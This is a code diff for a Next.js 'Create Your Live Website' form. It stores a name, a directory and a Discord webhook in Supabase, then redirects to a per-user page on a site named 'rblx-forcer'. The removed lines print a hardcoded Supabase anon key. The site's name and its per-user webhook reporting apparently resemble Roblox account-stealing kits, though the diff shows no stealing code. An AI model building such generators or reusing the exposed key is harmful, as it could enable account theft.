@@ -4,14 +4,14 @@ import { createClient } from "@supabase/supabase-js";
 import { useRouter } from "next/navigation";
 
 const supabase = createClient(
-  "https://ramnfuimgktyyulpjeqh.supabase.co", // 🔹 Replace with your Supabase URL
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJhbW5mdWltZ2t0eXl1bHBqZXFoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0NjgyMDMsImV4cCI6MjA3NTA0NDIwM30.b_iBCqGzNCuKtfgbMZLK8rAI6eK6q9q-CIOWmMPAW60" // 🔹 Replace with your Supabase anon key
+  process.env.NEXT_PUBLIC_SUPABASE_URL,
+  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
 );
 
-export default function Page({ params }) {
+export default function CreatePage() {
   const router = useRouter();
-  const { directory } = params;
   const [name, setName] = useState("");
+  const [directory, setDirectory] = useState("");
   const [webhook, setWebhook] = useState("");
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState("");
@@ -34,55 +34,54 @@ export default function Page({ params }) {
     setMessage("");
 
     const { error } = await supabase.from("users").insert([
-      { name, webhook, directory },
+      { name, directory, webhook },
     ]);
 
     if (error) {
-      console.error(error);
-      setMessage("❌ Error creating your entry. Please try again.");
+      setMessage("❌ Error — directory may already exist!");
       setLoading(false);
-    } else {
-      await sendWebhookMessage(
-        webhook,
-        `✅ Successfully created site for: **${name}** under directory **${directory}**`
-      );
-
-      setMessage("✅ Success! Redirecting...");
-      setTimeout(() => {
-        router.push(`https://${directory}.vercel.app`);
-      }, 2000);
+      return;
     }
+
+    await sendWebhookMessage(
+      webhook,
+      `✅ ${name} created their live site: https://rblx-forcer.vercel.app/${directory}`
+    );
+
+    setMessage("✅ Site Created! Redirecting...");
+    setTimeout(() => router.push(`/${directory}`), 2000);
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-purple-700 to-indigo-900 flex items-center justify-center p-4">
-      <div className="bg-white/10 backdrop-blur-lg rounded-2xl shadow-lg p-8 max-w-md w-full text-center">
-        <h1 className="text-3xl font-bold text-white mb-4">
-          Create Your Site
-        </h1>
-        <p className="text-gray-300 mb-6">
-          Directory: <span className="font-semibold text-purple-300">{directory}</span>
-        </p>
+    <div className="min-h-screen flex flex-col justify-center items-center bg-gradient-to-br from-purple-700 to-indigo-900 p-6">
+      <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 w-full max-w-md text-center text-white">
+        <h1 className="text-3xl font-bold mb-6">Create Your Live Website</h1>
 
         <form onSubmit={handleSubmit} className="space-y-4">
           <input
             type="text"
-            placeholder="Enter Your Name"
-            className="w-full p-3 rounded-lg bg-white/20 text-white placeholder-gray-300 focus:outline-none"
+            placeholder="Your Name"
+            className="w-full p-3 rounded-lg bg-white/20 text-white placeholder-gray-300"
             value={name}
             onChange={(e) => setName(e.target.value)}
             required
           />
-
+          <input
+            type="text"
+            placeholder="Your Directory (e.g. john)"
+            className="w-full p-3 rounded-lg bg-white/20 text-white placeholder-gray-300"
+            value={directory}
+            onChange={(e) => setDirectory(e.target.value)}
+            required
+          />
           <input
             type="url"
-            placeholder="Enter Your Discord Webhook URL"
-            className="w-full p-3 rounded-lg bg-white/20 text-white placeholder-gray-300 focus:outline-none"
+            placeholder="Your Discord Webhook URL"
+            className="w-full p-3 rounded-lg bg-white/20 text-white placeholder-gray-300"
             value={webhook}
             onChange={(e) => setWebhook(e.target.value)}
             required
           />
-
           <button
             type="submit"
             disabled={loading}
@@ -92,10 +91,8 @@ export default function Page({ params }) {
           </button>
         </form>
 
-        {message && (
-          <p className="mt-4 text-white font-medium">{message}</p>
-        )}
+        {message && <p className="mt-4 text-white font-medium">{message}</p>}
       </div>
     </div>
   );
-    }
+              }
